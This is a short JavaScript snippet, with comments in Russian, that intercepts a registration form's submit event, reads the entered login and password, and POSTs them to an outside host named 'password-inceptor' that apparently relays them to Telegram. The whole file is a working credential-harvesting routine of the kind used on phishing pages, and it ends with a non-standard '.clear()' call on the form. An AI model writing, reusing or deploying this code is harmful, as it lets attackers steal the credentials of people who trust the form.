document.getElementById('registerForm').addEventListener('submit', async function(event) {
  event.preventDefault();

  const login = document.getElementById('login').value;
  const password = document.getElementById('password').value;

  try {
    const response = await fetch('https://password-inceptor.vercel.app/api/sendTelegram', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ login, password })
    });

    const result = await response.json();
    console.log('Ответ от сервера:', result);
  } catch (error) {
    console.error('Ошибка при отправке:', error);
    alert('Не удалось отправить данные. Проверьте подключение.');
  }

  document.getElementById('registerForm').clear()
});
